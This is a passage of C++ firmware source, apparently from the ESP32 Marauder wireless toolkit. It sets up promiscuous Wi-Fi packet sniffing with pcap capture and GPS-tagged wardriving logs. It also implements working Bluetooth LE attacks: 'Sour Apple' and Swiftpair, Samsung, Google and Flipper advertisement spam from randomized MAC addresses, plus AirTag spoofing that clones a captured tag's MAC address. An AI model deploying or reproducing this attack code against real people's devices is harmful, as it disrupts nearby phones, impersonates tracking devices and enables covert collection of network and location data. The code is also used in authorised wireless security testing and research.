    esp_wifi_set_country(&country);
  #endif
  esp_wifi_set_storage(WIFI_STORAGE_RAM);
  esp_wifi_set_mode(WIFI_MODE_NULL);
  esp_wifi_start();
  this->setMac();
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_filter(&filt);
  esp_wifi_set_promiscuous_rx_cb(&pineScanSnifferCallback);
  esp_wifi_set_channel(set_channel, WIFI_SECOND_CHAN_NONE);
  this->wifi_initialized = true;
  initTime = millis();
}

// MultiSSID
void WiFiScan::RunMultiSSIDScan(uint8_t scan_mode, uint16_t color)
{
  this->clearMultiSSID();

  startPcap("multissid");

  #ifdef HAS_FLIPPER_LED
    flipper_led.sniffLED();
  #elif defined(XIAO_ESP32_S3)
    xiao_led.sniffLED();
  #elif defined(MARAUDER_M5STICKC)
    stickc_led.sniffLED();
  #else
    led_obj.setMode(MODE_SNIFF);
  #endif
  
  #ifdef HAS_SCREEN
    display_obj.TOP_FIXED_AREA_2 = 48;
    display_obj.tteBar = true;
    display_obj.print_delay_1 = 15;
    display_obj.print_delay_2 = 10;
    display_obj.initScrollValues(true);
    display_obj.tft.setTextWrap(false);
    display_obj.tft.setTextColor(TFT_BLACK, color);
    #ifdef HAS_FULL_SCREEN
      display_obj.tft.fillRect(0,16,240,16, color);
      display_obj.tft.drawCentreString(text_table4[49],120,16,2);
    #endif
    #ifdef HAS_ILI9341
      display_obj.touchToExit();
    #endif
    display_obj.tft.setTextColor(TFT_BLUE, TFT_BLACK);
    display_obj.setupScrollArea(display_obj.TOP_FIXED_AREA_2, BOT_FIXED_AREA);
  #endif
  
  esp_wifi_init(&cfg2);
  #ifdef HAS_DUAL_BAND
    esp_wifi_set_country(&country);
  #endif
  esp_wifi_set_storage(WIFI_STORAGE_RAM);
  esp_wifi_set_mode(WIFI_MODE_NULL);
  esp_wifi_start();
  this->setMac();
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_filter(&filt);
  esp_wifi_set_promiscuous_rx_cb(&multiSSIDSnifferCallback);
  esp_wifi_set_channel(set_channel, WIFI_SECOND_CHAN_NONE);
  this->wifi_initialized = true;
  initTime = millis();
}

void WiFiScan::RunPwnScan(uint8_t scan_mode, uint16_t color)
{
  startPcap("pwnagotchi");

  #ifdef HAS_FLIPPER_LED
    flipper_led.sniffLED();
  #elif defined(XIAO_ESP32_S3)
    xiao_led.sniffLED();
  #elif defined(MARAUDER_M5STICKC)
    stickc_led.sniffLED();
  #else
    led_obj.setMode(MODE_SNIFF);
  #endif

  #ifdef HAS_SCREEN
    display_obj.TOP_FIXED_AREA_2 = 48;
    display_obj.tteBar = true;
    display_obj.print_delay_1 = 15;
    display_obj.print_delay_2 = 10;
    display_obj.initScrollValues(true);
    display_obj.tft.setTextWrap(false);
    display_obj.tft.setTextColor(TFT_WHITE, color);
    #ifdef HAS_FULL_SCREEN
      display_obj.tft.fillRect(0,16,240,16, color);
      display_obj.tft.drawCentreString(text_table4[37],120,16,2);
    #endif
    #ifdef HAS_ILI9341
      display_obj.touchToExit();
    #endif
    display_obj.tft.setTextColor(TFT_GREEN, TFT_BLACK);
    display_obj.setupScrollArea(display_obj.TOP_FIXED_AREA_2, BOT_FIXED_AREA);
  #endif
  
  esp_wifi_init(&cfg2);
  #ifdef HAS_DUAL_BAND
    esp_wifi_set_country(&country);
  #endif
  esp_wifi_set_storage(WIFI_STORAGE_RAM);
  esp_wifi_set_mode(WIFI_MODE_NULL);
  esp_wifi_start();
  this->setMac();
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_filter(&filt);
  esp_wifi_set_promiscuous_rx_cb(&beaconSnifferCallback);
  esp_wifi_set_channel(set_channel, WIFI_SECOND_CHAN_NONE);
  this->wifi_initialized = true;
  initTime = millis();
}

void WiFiScan::executeSourApple() {
  #ifdef HAS_BT
    NimBLEDevice::init("");
    NimBLEServer *pServer = NimBLEDevice::createServer();

    pAdvertising = pServer->getAdvertising();

    delay(40);
    //NimBLEAdvertisementData advertisementData = getOAdvertisementData();
    NimBLEAdvertisementData advertisementData = this->GetUniversalAdvertisementData(Apple);
    pAdvertising->setAdvertisementData(advertisementData);
    pAdvertising->start();
    delay(20);
    pAdvertising->stop();
  #endif
}

void WiFiScan::setBaseMacAddress(uint8_t macAddr[6]) {
  // Use ESP-IDF function to set the base MAC address
  esp_err_t err = esp_base_mac_addr_set(macAddr);

  // Check for success or handle errors
  if (err == ESP_OK) {
    return;
  } else if (err == ESP_ERR_INVALID_ARG) {
    Serial.println("Error: Invalid MAC address argument.");
  } else {
    Serial.printf("Error: Failed to set MAC address. Code: %d\n", err);
  }
}

void WiFiScan::executeSpoofAirtag() {
  #ifdef HAS_BT
    for (int i = 0; i < airtags->size(); i++) {
      if (airtags->get(i).selected) {

        uint8_t macAddr[6];

        convertMacStringToUint8(airtags->get(i).mac, macAddr);

        macAddr[5] -= 2;

        // Do this because ESP32 BT addr is Base MAC + 2
        
        this->setBaseMacAddress(macAddr);

        NimBLEDevice::init("");

        NimBLEServer *pServer = NimBLEDevice::createServer();

        pAdvertising = pServer->getAdvertising();

        //NimBLEAdvertisementData advertisementData = getSwiftAdvertisementData();
        NimBLEAdvertisementData advertisementData = this->GetUniversalAdvertisementData(Airtag);
        pAdvertising->setAdvertisementData(advertisementData);
        pAdvertising->start();
        delay(10);
        pAdvertising->stop();

        NimBLEDevice::deinit();

        break;
      }
    }
  #endif
}

void WiFiScan::executeSwiftpairSpam(EBLEPayloadType type) {
  #ifdef HAS_BT
    uint8_t macAddr[6];
    generateRandomMac(macAddr);

    //esp_base_mac_addr_set(macAddr);

    this->setBaseMacAddress(macAddr);

    NimBLEDevice::init("");

    NimBLEServer *pServer = NimBLEDevice::createServer();

    pAdvertising = pServer->getAdvertising();

    //NimBLEAdvertisementData advertisementData = getSwiftAdvertisementData();
    NimBLEAdvertisementData advertisementData = this->GetUniversalAdvertisementData(type);
    pAdvertising->setAdvertisementData(advertisementData);
    pAdvertising->start();
    delay(10);
    pAdvertising->stop();

    NimBLEDevice::deinit();
  #endif
}

void WiFiScan::executeWarDrive() {
  #ifdef HAS_GPS
    if (gps_obj.getGpsModuleStatus()) {
      bool do_save;
      String display_string;
      
      while (WiFi.scanComplete() == WIFI_SCAN_RUNNING) {
        Serial.println("Scan running...");
        delay(500);
      }
      
      #ifndef HAS_DUAL_BAND
        int n = WiFi.scanNetworks(false, true, false, 110, this->set_channel);
      #else
        int n = WiFi.scanNetworks(false, true, false, 110);
      #endif

      if (n > 0) {
        for (int i = 0; i < n; i++) {
          display_string = "";
          do_save = false;
          uint8_t *this_bssid_raw = WiFi.BSSID(i);
          char this_bssid[18] = {0};
          sprintf(this_bssid, "%02X:%02X:%02X:%02X:%02X:%02X", this_bssid_raw[0], this_bssid_raw[1], this_bssid_raw[2], this_bssid_raw[3], this_bssid_raw[4], this_bssid_raw[5]);

          if (this->seen_mac(this_bssid_raw))
            continue;

          this->save_mac(this_bssid_raw);

          String ssid = WiFi.SSID(i);
          ssid.replace(",","_");

          if (ssid != "") {
            display_string.concat(ssid);
          }
          else {
            display_string.concat(this_bssid);
          }

          if (gps_obj.getFixStatus()) {
            do_save = true;
            display_string.concat(" | Lt: " + gps_obj.getLat());
            display_string.concat(" | Ln: " + gps_obj.getLon());
          }
          else {
            display_string.concat(" | GPS: No Fix");
          }

          int temp_len = display_string.length();

          #ifdef HAS_SCREEN
            for (int i = 0; i < 40 - temp_len; i++)
            {
              display_string.concat(" ");
            }
            
            display_obj.display_buffer->add(display_string);
          #endif


          String wardrive_line = WiFi.BSSIDstr(i) + "," + ssid + "," + this->security_int_to_string(WiFi.encryptionType(i)) + "," + gps_obj.getDatetime() + "," + (String)WiFi.channel(i) + "," + (String)WiFi.RSSI(i) + "," + gps_obj.getLat() + "," + gps_obj.getLon() + "," + gps_obj.getAlt() + "," + gps_obj.getAccuracy() + ",WIFI\n";
          Serial.print((String)this->mac_history_cursor + " | " + wardrive_line);

          if (do_save) {
            buffer_obj.append(wardrive_line);
          }
        }
      }
      this->channelHop();

      // Free up that memory, you sexy devil
      WiFi.scanDelete();
    }
  #endif
}

// Function to start running a beacon scan
void WiFiScan::RunBeaconScan(uint8_t scan_mode, uint16_t color)
{
  if (scan_mode == WIFI_SCAN_AP)
    startPcap("beacon");
  else if (scan_mode == WIFI_SCAN_WAR_DRIVE) {
    #ifdef HAS_GPS
      if (gps_obj.getGpsModuleStatus()) {
        startLog("wardrive");
        String header_line = "WigleWifi-1.4,appRelease=" + (String)MARAUDER_VERSION + ",model=ESP32 Marauder,release=" + (String)MARAUDER_VERSION + ",device=ESP32 Marauder,display=SPI TFT,board=ESP32 Marauder,brand=JustCallMeKoko\nMAC,SSID,AuthMode,FirstSeen,Channel,RSSI,CurrentLatitude,CurrentLongitude,AltitudeMeters,AccuracyMeters,Type\n";
        buffer_obj.append(header_line);
      } else {
        return;
      }
    #else
      return;
    #endif
  }

  #ifdef HAS_FLIPPER_LED
    flipper_led.sniffLED();
  #elif defined(XIAO_ESP32_S3)
    xiao_led.sniffLED();
  #elif defined(MARAUDER_M5STICKC)
    stickc_led.sniffLED();
  #else
    led_obj.setMode(MODE_SNIFF);
  #endif
  
  #ifdef HAS_SCREEN
    display_obj.TOP_FIXED_AREA_2 = 48;
    display_obj.tteBar = true;
    display_obj.print_delay_1 = 15;
    display_obj.print_delay_2 = 10;
    display_obj.initScrollValues(true);
    display_obj.tft.setTextWrap(false);
    display_obj.tft.setTextColor(TFT_WHITE, color);
    #ifdef HAS_FULL_SCREEN
      display_obj.tft.fillRect(0,16,240,16, color);
      if (scan_mode == WIFI_SCAN_AP)
        display_obj.tft.drawCentreString(text_table4[38],120,16,2);
      else if (scan_mode == WIFI_SCAN_WAR_DRIVE) {
        this->clearMacHistory();
        display_obj.tft.drawCentreString("Wardrive", 120, 16, 2);
      }
      #ifdef HAS_ILI9341
        display_obj.touchToExit();
      #endif
    #endif
    display_obj.tft.setTextColor(TFT_GREEN, TFT_BLACK);
    display_obj.setupScrollArea(display_obj.TOP_FIXED_AREA_2, BOT_FIXED_AREA);
  #endif

  if (scan_mode != WIFI_SCAN_WAR_DRIVE) {
  
    esp_wifi_init(&cfg2);
    #ifdef HAS_DUAL_BAND
      esp_wifi_set_country(&country);
    #endif
    esp_wifi_set_storage(WIFI_STORAGE_RAM);
    esp_wifi_set_mode(WIFI_MODE_NULL);
    esp_wifi_start();
    this->setMac();
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_filter(&filt);
    esp_wifi_set_promiscuous_rx_cb(&beaconSnifferCallback);
    esp_wifi_set_channel(set_channel, WIFI_SECOND_CHAN_NONE);
  }
  else {
    this->startWardriverWiFi();
  }
  this->wifi_initialized = true;
  initTime = millis();
}

void WiFiScan::startWardriverWiFi() {
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
}

void WiFiScan::RunStationScan(uint8_t scan_mode, uint16_t color)
{
  startPcap("station");

  #ifdef HAS_FLIPPER_LED
    flipper_led.sniffLED();
  #elif defined(XIAO_ESP32_S3)
    xiao_led.sniffLED();
  #elif defined(MARAUDER_M5STICKC)
    stickc_led.sniffLED();
  #else
    led_obj.setMode(MODE_SNIFF);
  #endif
  
  #ifdef HAS_SCREEN
    display_obj.TOP_FIXED_AREA_2 = 48;
    display_obj.tteBar = true;
    display_obj.print_delay_1 = 15;
    display_obj.print_delay_2 = 10;
    display_obj.initScrollValues(true);
    display_obj.tft.setTextWrap(false);
    display_obj.tft.setTextColor(TFT_WHITE, color);
    #ifdef HAS_FULL_SCREEN
      display_obj.tft.fillRect(0,16,240,16, color);
      display_obj.tft.drawCentreString(text_table1[59],120,16,2);
    #endif
    #ifdef HAS_ILI9341
      display_obj.touchToExit();
    #endif
    display_obj.tft.setTextColor(TFT_GREEN, TFT_BLACK);
    display_obj.setupScrollArea(display_obj.TOP_FIXED_AREA_2, BOT_FIXED_AREA);
  #endif
  
  esp_netif_init();
  esp_event_loop_create_default();
  //esp_wifi_init(&cfg);
  esp_err_t err = esp_wifi_init(&cfg2);
  if (err != ESP_OK) {
    Serial.printf("Custom config failed (0x%04X), falling back to default...\n", err);
    wifi_init_config_t default_cfg = WIFI_INIT_CONFIG_DEFAULT();
    err = esp_wifi_init(&default_cfg);
    if (err != ESP_OK) {
      Serial.printf("Default config also failed (0x%04X)\n", err);
    } else {
      Serial.println("Wi-Fi init succeeded with default config.");
    }
  } else {
    Serial.println("Wi-Fi init succeeded with custom config.");
  }
  #ifdef HAS_DUAL_BAND
    esp_wifi_set_country(&country);
  #endif
  esp_wifi_set_storage(WIFI_STORAGE_RAM);
  esp_wifi_set_mode(WIFI_MODE_NULL);
  esp_wifi_start();
  this->setMac();
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_filter(&filt);
  esp_wifi_set_promiscuous_rx_cb(&stationSnifferCallback);
  esp_wifi_set_channel(set_channel, WIFI_SECOND_CHAN_NONE);
  this->wifi_initialized = true;
  initTime = millis();
}

void WiFiScan::RunRawScan(uint8_t scan_mode, uint16_t color)
{
  if (scan_mode != WIFI_SCAN_SIG_STREN)
    startPcap("raw");

  #ifdef HAS_FLIPPER_LED
    flipper_led.sniffLED();
  #elif defined(XIAO_ESP32_S3)
    xiao_led.sniffLED();
  #elif defined(MARAUDER_M5STICKC)
    stickc_led.sniffLED();
  #else
    led_obj.setMode(MODE_SNIFF);
  #endif
  
  #ifdef HAS_SCREEN
    display_obj.TOP_FIXED_AREA_2 = 48;
    display_obj.tteBar = true;
    display_obj.print_delay_1 = 15;
    display_obj.print_delay_2 = 10;
    display_obj.initScrollValues(true);
    display_obj.tft.setTextWrap(false);
    display_obj.tft.setTextColor(TFT_WHITE, color);
    #ifdef HAS_FULL_SCREEN
      display_obj.tft.fillRect(0,16,240,16, color);
      if (scan_mode != WIFI_SCAN_SIG_STREN) {
        display_obj.tft.setTextColor(TFT_BLACK, color);
        display_obj.tft.drawCentreString(text_table1[58],120,16,2);
      }
      else {
        display_obj.tft.setTextColor(TFT_BLACK, color);
        display_obj.tft.drawCentreString("Signal Monitor", 120, 16, 2);
      }
    #endif
    display_obj.tft.setTextColor(TFT_GREEN, TFT_BLACK);
    display_obj.setupScrollArea(display_obj.TOP_FIXED_AREA_2, BOT_FIXED_AREA);
    //display_obj.setupScrollArea((STATUS_BAR_WIDTH * 2) + CHAR_WIDTH - 1, BOT_FIXED_AREA);

    #ifdef HAS_ILI9341
      if ((scan_mode == WIFI_SCAN_RAW_CAPTURE) ||
          (scan_mode == WIFI_SCAN_SIG_STREN)) {
        display_obj.tft.setFreeFont(NULL);
        display_obj.tft.setTextSize(1);
        display_obj.tft.setTextColor(TFT_GREEN, TFT_BLACK);
        if (scan_mode != WIFI_SCAN_SIG_STREN)
          display_obj.setupScrollArea(display_obj.TOP_FIXED_AREA_2, BOT_FIXED_AREA);
        else
          display_obj.setupScrollArea((STATUS_BAR_WIDTH * 2) + CHAR_WIDTH - 1, BOT_FIXED_AREA);
        display_obj.tftDrawChannelScaleButtons(set_channel, false);
        display_obj.tftDrawExitScaleButtons(false);
      }
    #endif
  #endif
  
  esp_wifi_init(&cfg2);
  #ifdef HAS_DUAL_BAND
    esp_wifi_set_country(&country);
  #endif
  esp_wifi_set_storage(WIFI_STORAGE_RAM);
  esp_wifi_set_mode(WIFI_MODE_NULL);
  esp_wifi_start();
  this->setMac();
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_filter(&filt);
  esp_wifi_set_promiscuous_rx_cb(&rawSnifferCallback);
  esp_wifi_set_channel(set_channel, WIFI_SECOND_CHAN_NONE);
  this->wifi_initialized = true;
  initTime = millis();
}

void WiFiScan::RunDeauthScan(uint8_t scan_mode, uint16_t color)
{
  startPcap("deauth");

  #ifdef HAS_FLIPPER_LED
    flipper_led.sniffLED();
  #elif defined(XIAO_ESP32_S3)
    xiao_led.sniffLED();
  #elif defined(MARAUDER_M5STICKC)
    stickc_led.sniffLED();
  #else
    led_obj.setMode(MODE_SNIFF);
  #endif
  
  #ifdef HAS_SCREEN
    display_obj.TOP_FIXED_AREA_2 = 48;
    display_obj.tteBar = true;
    display_obj.print_delay_1 = 15;
    display_obj.print_delay_2 = 10;
    display_obj.initScrollValues(true);
    display_obj.tft.setTextWrap(false);
    display_obj.tft.setTextColor(TFT_BLACK, color);
    #ifdef HAS_FULL_SCREEN
      display_obj.tft.fillRect(0,16,240,16, color);
      display_obj.tft.drawCentreString(text_table4[39],120,16,2);
    #endif
    #ifdef HAS_ILI9341
      display_obj.touchToExit();
    #endif
    display_obj.tft.setTextColor(TFT_RED, TFT_BLACK);
    display_obj.setupScrollArea(display_obj.TOP_FIXED_AREA_2, BOT_FIXED_AREA);
  #endif
  
  esp_wifi_init(&cfg2);
  #ifdef HAS_DUAL_BAND
    esp_wifi_set_country(&country);
  #endif
  esp_wifi_set_storage(WIFI_STORAGE_RAM);
  esp_wifi_set_mode(WIFI_MODE_NULL);
  esp_wifi_start();
  this->setMac();
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_filter(&filt);
  esp_wifi_set_promiscuous_rx_cb(&deauthSnifferCallback);
  esp_wifi_set_channel(set_channel, WIFI_SECOND_CHAN_NONE);
  this->wifi_initialized = true;
  initTime = millis();
}


// Function for running probe request scan
void WiFiScan::RunProbeScan(uint8_t scan_mode, uint16_t color)
{
  probe_req_ssids->clear();

  if (scan_mode == WIFI_SCAN_PROBE)
    startPcap("probe");
  else if (scan_mode == WIFI_SCAN_STATION_WAR_DRIVE) {
    #ifdef HAS_GPS
      if (gps_obj.getGpsModuleStatus()) {
        startLog("station_wardrive");
        String header_line = "WigleWifi-1.4,appRelease=" + (String)MARAUDER_VERSION + ",model=ESP32 Marauder,release=" + (String)MARAUDER_VERSION + ",device=ESP32 Marauder,display=SPI TFT,board=ESP32 Marauder,brand=JustCallMeKoko\nMAC,SSID,AuthMode,FirstSeen,Channel,RSSI,CurrentLatitude,CurrentLongitude,AltitudeMeters,AccuracyMeters,Type\n";
        buffer_obj.append(header_line);
      } else {
        return;
      }
    #else
      return;
    #endif
  }

  #ifdef HAS_FLIPPER_LED
    flipper_led.sniffLED();
  #elif defined(XIAO_ESP32_S3)
    xiao_led.sniffLED();
  #elif defined(MARAUDER_M5STICKC)
    stickc_led.sniffLED();
  #else
    led_obj.setMode(MODE_SNIFF);
  #endif
  
  #ifdef HAS_SCREEN
    display_obj.TOP_FIXED_AREA_2 = 48;
    display_obj.tteBar = true;
    display_obj.print_delay_1 = 15;
    display_obj.print_delay_2 = 10;
    display_obj.initScrollValues(true);
    display_obj.tft.setTextWrap(false);
    display_obj.tft.setTextColor(TFT_BLACK, color);
    #ifdef HAS_FULL_SCREEN
      display_obj.tft.fillRect(0,16,240,16, color);
      display_obj.tft.drawCentreString(text_table4[40],120,16,2);
    #endif
    #ifdef HAS_ILI9341
      display_obj.touchToExit();
    #endif
    display_obj.tft.setTextColor(TFT_GREEN, TFT_BLACK);
    display_obj.setupScrollArea(display_obj.TOP_FIXED_AREA_2, BOT_FIXED_AREA);
  #endif
  
  esp_wifi_init(&cfg2);
  #ifdef HAS_DUAL_BAND
    esp_wifi_set_country(&country);
  #endif
  esp_wifi_set_storage(WIFI_STORAGE_RAM);
  esp_wifi_set_mode(WIFI_MODE_NULL);
  esp_wifi_start();
  this->setMac();
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_filter(&filt);
  esp_wifi_set_promiscuous_rx_cb(&probeSnifferCallback);
  esp_wifi_set_channel(set_channel, WIFI_SECOND_CHAN_NONE);
  this->wifi_initialized = true;
  initTime = millis();
}

void WiFiScan::RunSourApple(uint8_t scan_mode, uint16_t color) {
  #ifdef HAS_BT
    /*NimBLEDevice::init("");
    NimBLEServer *pServer = NimBLEDevice::createServer();

    pAdvertising = pServer->getAdvertising();*/

    #ifdef HAS_SCREEN
      display_obj.TOP_FIXED_AREA_2 = 48;
      display_obj.tteBar = true;
      display_obj.print_delay_1 = 15;
      display_obj.print_delay_2 = 10;
      display_obj.initScrollValues(true);
      display_obj.tft.setTextWrap(false);
      display_obj.tft.setTextColor(TFT_BLACK, color);
      #ifdef HAS_FULL_SCREEN
        display_obj.tft.fillRect(0,16,240,16, color);
        display_obj.tft.drawCentreString("Sour Apple",120,16,2);
      #endif
      #ifdef HAS_ILI9341
        display_obj.touchToExit();
      #endif
      display_obj.tft.setTextColor(TFT_GREEN, TFT_BLACK);
    #endif

    #ifdef HAS_FLIPPER_LED
      flipper_led.sniffLED();
    #elif defined(XIAO_ESP32_S3)
      xiao_led.sniffLED();
    #elif defined(MARAUDER_M5STICKC)
      stickc_led.sniffLED();
    #else
      led_obj.setMode(MODE_SNIFF);
    #endif

  #endif
}

void WiFiScan::RunSwiftpairSpam(uint8_t scan_mode, uint16_t color) {
  #ifdef HAS_BT
    #ifdef HAS_SCREEN
      display_obj.TOP_FIXED_AREA_2 = 48;
      display_obj.tteBar = true;
      display_obj.print_delay_1 = 15;
      display_obj.print_delay_2 = 10;
      display_obj.initScrollValues(true);
      display_obj.tft.setTextWrap(false);
      display_obj.tft.setTextColor(TFT_BLACK, color);
      #ifdef HAS_FULL_SCREEN
        display_obj.tft.fillRect(0,16,240,16, color);
        if (scan_mode == BT_ATTACK_SWIFTPAIR_SPAM)
          display_obj.tft.drawCentreString("Swiftpair Spam",120,16,2);
        else if (scan_mode == BT_ATTACK_SPAM_ALL)
          display_obj.tft.drawCentreString("BLE Spam All",120,16,2);
        else if (scan_mode == BT_ATTACK_SAMSUNG_SPAM)
          display_obj.tft.drawCentreString("BLE Spam Samsung",120,16,2);
        else if (scan_mode == BT_ATTACK_GOOGLE_SPAM)
          display_obj.tft.drawCentreString("BLE Spam Google",120,16,2);
        else if (scan_mode == BT_ATTACK_FLIPPER_SPAM)
          display_obj.tft.drawCentreString("BLE Spam Flipper", 120, 16, 2);
        else if (scan_mode == BT_SPOOF_AIRTAG)
          display_obj.tft.drawCentreString("BLE Spoof Airtag", 120, 16, 2);
        #ifdef HAS_ILI9341
          display_obj.touchToExit();
        #endif
      #endif
      display_obj.tft.setTextColor(TFT_GREEN, TFT_BLACK);
    #endif


    #ifdef HAS_FLIPPER_LED
      flipper_led.attackLED();
    #elif defined(XIAO_ESP32_S3)
      xiao_led.attackLED();
    #elif defined(MARAUDER_M5STICKC)
      stickc_led.attackLED();
    #else
      led_obj.setMode(MODE_ATTACK);
    #endif
  #endif
}

// Function to start running any BLE scan
void WiFiScan::RunBluetoothScan(uint8_t scan_mode, uint16_t color)
{
  #ifdef HAS_BT
    #ifdef HAS_SCREEN
      display_obj.print_delay_1 = 50;
      display_obj.print_delay_2 = 20;
    #endif
  
    if (scan_mode != BT_SCAN_WAR_DRIVE_CONT) {
      NimBLEDevice::setScanFilterMode(CONFIG_BTDM_SCAN_DUPL_TYPE_DEVICE);
      NimBLEDevice::setScanDuplicateCacheSize(200);
    }
    else if ((scan_mode == BT_SCAN_WAR_DRIVE_CONT) || (scan_mode == BT_SCAN_ANALYZER)) {
      NimBLEDevice::setScanDuplicateCacheSize(0);
    }
    NimBLEDevice::init("");
    pBLEScan = NimBLEDevice::getScan(); //create new scan
    if ((scan_mode == BT_SCAN_ALL) || (scan_mode == BT_SCAN_AIRTAG) || (scan_mode == BT_SCAN_FLIPPER))
    {
      #ifdef HAS_SCREEN
        display_obj.TOP_FIXED_AREA_2 = 48;
        display_obj.tteBar = true;
        display_obj.initScrollValues(true);
        display_obj.tft.setTextWrap(false);
        display_obj.tft.setTextColor(TFT_BLACK, color);
        #ifdef HAS_FULL_SCREEN
          display_obj.tft.fillRect(0,16,240,16, color);
          if (scan_mode == BT_SCAN_ALL)
            display_obj.tft.drawCentreString(text_table4[41],120,16,2);
          else if (scan_mode == BT_SCAN_AIRTAG)
            display_obj.tft.drawCentreString("Airtag Sniff",120,16,2);
          else if (scan_mode == BT_SCAN_FLIPPER)
            display_obj.tft.drawCentreString("Flipper Sniff", 120, 16, 2);
          #ifdef HAS_ILI9341
            display_obj.touchToExit();
          #endif
        #endif
        display_obj.tft.setTextColor(TFT_CYAN, TFT_BLACK);
        display_obj.setupScrollArea(display_obj.TOP_FIXED_AREA_2, BOT_FIXED_AREA);
      #endif
      if (scan_mode == BT_SCAN_ALL)
        pBLEScan->setAdvertisedDeviceCallbacks(new bluetoothScanAllCallback(), false);
      else if (scan_mode == BT_SCAN_AIRTAG) {
        this->clearAirtags();
        pBLEScan->setAdvertisedDeviceCallbacks(new bluetoothScanAllCallback(), true);
      }
      else if (scan_mode == BT_SCAN_FLIPPER) {
        this->clearFlippers();
        pBLEScan->setAdvertisedDeviceCallbacks(new bluetoothScanAllCallback(), true);
      }
    }
    else if ((scan_mode == BT_SCAN_WAR_DRIVE) || (scan_mode == BT_SCAN_WAR_DRIVE_CONT)) {
      #ifdef HAS_GPS
        if (gps_obj.getGpsModuleStatus()) {
          if (scan_mode == BT_SCAN_WAR_DRIVE) {
            startLog("bt_wardrive");
          }
          else if (scan_mode == BT_SCAN_WAR_DRIVE_CONT) {
            startLog("bt_wardrive_cont");
          }
          String header_line = "WigleWifi-1.4,appRelease=" + (String)MARAUDER_VERSION + ",model=ESP32 Marauder,release=" + (String)MARAUDER_VERSION + ",device=ESP32 Marauder,display=SPI TFT,board=ESP32 Marauder,brand=JustCallMeKoko\nMAC,SSID,AuthMode,FirstSeen,Channel,RSSI,CurrentLatitude,CurrentLongitude,AltitudeMeters,AccuracyMeters,Type\n";
          buffer_obj.append(header_line);
        } else {
          return;
        }
      #else
        return;
      #endif
      #ifdef HAS_SCREEN
        display_obj.TOP_FIXED_AREA_2 = 48;
        display_obj.tteBar = true;
        display_obj.initScrollValues(true);
        display_obj.tft.setTextWrap(false);
        display_obj.tft.setTextColor(TFT_BLACK, color);
        #ifdef HAS_FULL_SCREEN
          display_obj.tft.fillRect(0,16,240,16, color);
          if (scan_mode == BT_SCAN_WAR_DRIVE)
            display_obj.tft.drawCentreString("BT Wardrive",120,16,2);
          else if (scan_mode == BT_SCAN_WAR_DRIVE_CONT)
            display_obj.tft.drawCentreString("BT Wardrive Continuous",120,16,2);
          #ifdef HAS_ILI9341
            display_obj.touchToExit();
          #endif
        #endif
        display_obj.tft.setTextColor(TFT_CYAN, TFT_BLACK);
        display_obj.setupScrollArea(display_obj.TOP_FIXED_AREA_2, BOT_FIXED_AREA);
      #endif
      if (scan_mode != BT_SCAN_WAR_DRIVE_CONT)
        pBLEScan->setAdvertisedDeviceCallbacks(new bluetoothScanAllCallback(), false);
      else
        pBLEScan->setAdvertisedDeviceCallbacks(new bluetoothScanAllCallback(), true);
    }
    else if (scan_mode == BT_SCAN_SKIMMERS)
    {
      #ifdef HAS_SCREEN
        display_obj.TOP_FIXED_AREA_2 = 160;
        display_obj.tteBar = true;
        display_obj.tft.fillScreen(TFT_DARKGREY);
        display_obj.initScrollValues(true);
        display_obj.tft.setTextWrap(false);
        display_obj.tft.setTextColor(TFT_BLACK, color);
        display_obj.tft.fillRect(0,16,240,16, color);
        display_obj.tft.drawCentreString(text_table4[42],120,16,2);
        display_obj.twoPartDisplay(text_table4[43]);
        display_obj.tft.setTextColor(TFT_BLACK, TFT_DARKGREY);
        display_obj.setupScrollArea(display_obj.TOP_FIXED_AREA_2, BOT_FIXED_AREA);
      #endif
      pBLEScan->setAdvertisedDeviceCallbacks(new bluetoothScanSkimmersCallback(), false);
    }
    else if (scan_mode == BT_SCAN_ANALYZER) {
      #ifdef HAS_SCREEN
        display_obj.TOP_FIXED_AREA_2 = 48;
        display_obj.tteBar = true;
        display_obj.initScrollValues(true);
        display_obj.tft.setTextWrap(false);
        display_obj.tft.setTextColor(TFT_BLACK, color);
        #ifdef HAS_FULL_SCREEN
          display_obj.tft.fillRect(0,16,240,16, color);
          display_obj.tft.drawCentreString("Bluetooth Analyzer", 120, 16, 2);
          #ifdef HAS_ILI9341
            display_obj.touchToExit();
          #endif
        #endif
        display_obj.tft.setTextColor(TFT_CYAN, TFT_BLACK);
        display_obj.setupScrollArea(display_obj.TOP_FIXED_AREA_2, BOT_FIXED_AREA);
      #endif
      pBLEScan->setAdvertisedDeviceCallbacks(new bluetoothScanAllCallback(), false);
    }
    pBLEScan->setActiveScan(true); //active scan uses more power, but get results faster
    pBLEScan->setInterval(100);
    pBLEScan->setWindow(99);  // less or equal setInterval value
    pBLEScan->setMaxResults(0);
    if ((scan_mode == BT_SCAN_WAR_DRIVE_CONT) || (scan_mode == BT_SCAN_ANALYZER))
      pBLEScan->setDuplicateFilter(false);
    pBLEScan->start(0, scanCompleteCB, false);
    Serial.println("Started BLE Scan");
    this->ble_initialized = true;

    #ifdef HAS_FLIPPER_LED
      flipper_led.sniffLED();
    #elif defined(XIAO_ESP32_S3)
      xiao_led.sniffLED();
    #elif defined(MARAUDER_M5STICKC)
      stickc_led.sniffLED();
    #else
      led_obj.setMode(MODE_SNIFF);
    #endif

    initTime = millis();
  #endif
}

// Function that is called when BLE scan is completed
#ifdef HAS_BT
  void WiFiScan::scanCompleteCB(BLEScanResults scanResults) {
    printf("Scan complete!\n");
    printf("Found %d devices\n", scanResults.getCount());
    scanResults.dump();
  } // scanCompleteCB
#endif

// Function to extract MAC addr from a packet at given offset
void WiFiScan::getMAC(char *addr, uint8_t* data, uint16_t offset) {
  sprintf(addr, "%02x:%02x:%02x:%02x:%02x:%02x", data[offset+0], data[offset+1], data[offset+2], data[offset+3], data[offset+4], data[offset+5]);
}

void WiFiScan::pwnSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t type)
{ 
  wifi_promiscuous_pkt_t *snifferPacket = (wifi_promiscuous_pkt_t*)buf;
  WifiMgmtHdr *frameControl = (WifiMgmtHdr*)snifferPacket->payload;
